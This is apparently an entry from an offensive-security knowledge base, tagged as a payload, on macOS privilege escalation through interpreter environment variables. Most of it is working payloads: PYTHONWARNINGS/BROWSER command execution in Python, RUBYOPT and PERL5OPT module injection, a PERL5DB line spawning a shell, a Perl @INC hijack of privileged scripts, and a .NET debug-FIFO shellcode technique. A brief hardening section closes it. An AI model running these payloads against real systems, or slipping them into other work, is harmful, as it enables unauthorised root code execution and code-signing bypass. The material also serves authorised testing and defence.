---
title: "macOS Interpreter Injection via Environment Variables"
type: payload
tags: [macos, injection, code-execution, privilege-escalation, interpreter]
phase: privilege-escalation
sources: [hacktricks-macos]
---

# macOS Interpreter Injection via Environment Variables

Signed, hardened, even library-validated interpreters honor language environment variables that inject code before the target script's first line executes. This bypasses code-signing and library-validation because no library is loaded: the trusted interpreter runs your code itself. Prime targets are privileged/root scripts (cron, LaunchDaemons, installers) and any Apple-signed interpreter reachable with an entitlement. See [[macos-code-signing]] for why an Apple-signed interpreter is trusted, and [[macos-library-injection]] for the dylib-based cousins.

## Payloads by runtime

```bash
# Python: PYTHONWARNINGS routes through the BROWSER handler -> command exec
PYTHONWARNINGS="all:0:antigravity.x:0:0" \
  BROWSER="/bin/sh -c 'id>/tmp/pwn' #%s" python3 /tmp/script.py
# also survives -I isolated mode by injecting -W:
BROWSER="/bin/sh -c 'id>/tmp/pwn' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py

# Ruby: prepend a load dir and force-require a module (works even with --disable-rubyopt)
printf 'system("id")\n' > /tmp/inject.rb
RUBYOPT="-I/tmp -rinject" ruby any.rb

# Perl: PERL5OPT runs -M module code at startup; PERL5DB runs under -d
printf 'package pmod; system("id"); 1;\n' > /tmp/pmod.pm
PERL5LIB=/tmp PERL5OPT=-Mpmod perl victim.pl
PERL5DB='system("/bin/zsh")' perl -d /usr/bin/admin_script.pl   # if the process uses -d
```

## Perl @INC hijack

`/Library/Perl/<ver>` exists, is not SIP-protected, and precedes the System dirs, so as root you can drop `/Library/Perl/5.30/File/Basename.pm` to hijack any privileged script doing `use File::Basename`.

## .NET Core debug FIFO injection

Each managed .NET Core process opens named-pipe debug FIFOs (`$TMPDIR/*-in` / `-out`). An unprivileged local process can speak the `dbgtransportsession` protocol (`MT_SessionRequest`, `MT_ReadMemory`, `MT_WriteMemory`), find an rwx region (`vmmap -pages <pid> | grep rwx/rwx`), and overwrite a Dynamic Function Table pointer to run shellcode (xpn PoC).

## Hardening

Strip these variables in privileged launchd jobs (`launchctl unsetenv PERL5OPT`, `env -i`), run interpreters in Perl taint mode (`-T`), and avoid running interpreters as root. This env-injection primitive also chains into a full SIP bypass when the interpreter is a child of an entitled daemon (see the Migraine entry on [[macos-sip]]).

## Sources

- HackTricks (macos-hardening).
